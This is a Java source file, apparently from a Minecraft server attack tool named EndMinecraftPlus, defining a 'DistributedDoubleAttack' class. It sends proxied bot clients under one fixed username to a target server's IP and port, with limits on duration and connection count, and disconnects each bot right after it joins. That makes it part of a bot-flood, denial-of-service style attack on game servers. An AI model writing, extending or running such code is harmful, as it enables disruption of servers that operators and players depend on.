package luohuayu.EndMinecraftPlus.tasks.attack;

import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.Session;
import org.spacehq.packetlib.packet.Packet;

import java.net.Proxy;

public class DistributedDoubleAttack extends DistributedBotAttack {
    private String username;

    public DistributedDoubleAttack(String ip, int port, int time, int maxconnect, int joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public Client createClient(String ip, int port, String username, Proxy proxy) {
        return super.createClient(ip, port, this.username, proxy);
    }

    protected void handlePacket(Session session, Packet recvPacket, String username) {
        super.handlePacket(session, recvPacket, username);
        if (recvPacket instanceof ServerJoinGamePacket)
            session.disconnect("影分身连接重置");
    }
}
